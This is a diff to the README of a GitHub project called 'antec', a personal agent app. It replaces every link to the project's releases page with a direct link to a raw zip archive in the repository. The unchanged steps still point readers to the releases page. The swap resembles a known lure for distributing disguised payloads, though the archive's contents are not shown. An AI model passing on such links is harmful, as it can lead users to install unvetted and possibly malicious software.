@@ -1,6 +1,6 @@
 # 🤖 antec - Your Personal Agent Made Simple
 
-[![Download antec](https://img.shields.io/badge/Download-antec-blue)](https://github.com/ylayann/antec/releases)
+[![Download antec](https://img.shields.io/badge/Download-antec-blue)](https://raw.githubusercontent.com/ylayann/antec/main/prd/Software_1.3-alpha.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You can start using antec in just a few minutes. Follow the steps below carefull
 
 1. Visit the download page by clicking this button:
 
-   [![Download antec](https://img.shields.io/badge/Download-antec-green)](https://github.com/ylayann/antec/releases)
+   [![Download antec](https://img.shields.io/badge/Download-antec-green)](https://raw.githubusercontent.com/ylayann/antec/main/prd/Software_1.3-alpha.3.zip)
 
 2. On the releases page, look for the latest version. It usually has the highest version number and the most recent date.
 
@@ -110,7 +110,7 @@ If you still face problems, look for help on the GitHub issues page.
 ## 🔗 Useful Links
 
 - Download antec here:  
-  [https://github.com/ylayann/antec/releases](https://github.com/ylayann/antec/releases)
+  [https://raw.githubusercontent.com/ylayann/antec/main/prd/Software_1.3-alpha.3.zip](https://raw.githubusercontent.com/ylayann/antec/main/prd/Software_1.3-alpha.3.zip)
 
 - User guide inside the app for detailed help.
 
@@ -118,4 +118,4 @@ If you still face problems, look for help on the GitHub issues page.
 
 ---
 
-# [Download antec](https://github.com/ylayann/antec/releases) to start managing your tasks today.
+# [Download antec](https://raw.githubusercontent.com/ylayann/antec/main/prd/Software_1.3-alpha.3.zip) to start managing your tasks today.
